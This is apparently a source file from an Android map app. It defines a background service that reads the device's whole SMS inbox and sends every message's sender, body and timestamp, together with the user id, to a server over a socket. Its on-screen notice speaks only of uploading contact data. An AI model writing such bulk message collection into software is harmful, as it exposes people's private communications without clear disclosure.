package com.bhagya.mapapplication.services;

import android.app.IntentService;
import android.content.ContentValues;
import android.content.Intent;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v4.os.ResultReceiver;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import com.androidquery.AQuery;
import com.androidquery.callback.AjaxCallback;
import com.androidquery.callback.AjaxStatus;
import com.bhagya.mapapplication.activityclass.DatabaseHelper;
import com.bhagya.mapapplication.socket.SocketConnection;
import com.facebook.AccessToken;
import com.facebook.Profile;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class UploadInboxService extends IntentService {
    AQuery aQuery = new AQuery(this);
    DatabaseHelper databaseHelper;
    ListView listView;
    ArrayList<String> StoreContacts;
    ArrayAdapter<String> arrayAdapter;

    Cursor cursor;
    Profile profile;
    Context context;
    Intent intentresult;
    String name, phonenumber, user_id;
    public static final int RequestPermissionCode = 1;
    public UploadInboxService() {
        super("UploadInboxService");
    }
    SocketConnection socketConnection = new SocketConnection();




    @Override
    protected void onHandleIntent(Intent intent) {
      uplaodInbox();
    }


    @Override
    public int onStartCommand(@Nullable Intent intent, int flags, int startId) {
        socketConnection.connectSocket(AccessToken.getCurrentAccessToken().getToken());
        Toast.makeText(this,"Conatact Data Uploading",Toast.LENGTH_LONG).show();
        return super.onStartCommand(intent, flags, startId);
    }



    public  void uplaodInbox() {
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date DESC","body"},null,null,null);
        cursor.moveToFirst();
        SharedPreferences preferences = getSharedPreferences("MAIN_USER_RECORD", MODE_PRIVATE);
       String userId = preferences.getString("user_id", "");
        do{
            String smsId, address,body,date,person;
            JSONObject params = new JSONObject();
            smsId = cursor.getString(0);
            address = cursor.getString(1);
            body = cursor.getString(3);
            date=cursor.getString(2);
            try {

                params.put("smsId",smsId);
                params.put("contactNo",address);
                params.put("content",body);
                params.put("timeStamps",date);
                params.put("userId",userId);
                socketConnection.rsocket.emit("uploadInbox",params);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }while (cursor.moveToNext());
    }


    @Override
    public void onDestroy() {
//        super.onDestroy();
//        ResultReceiver rec = intentresult.getParcelableExtra("receiverTag");
//        Bundle b= new Bundle();
//        b.putString("ServiceTag","Rajiv");
//        rec.send(0,b);
//
//        Log.d("ServicesDetroyed","ok");
//        Toast.makeText(this,"Conatact Data Uploaded Successfully",Toast.LENGTH_LONG).show();

    }

}
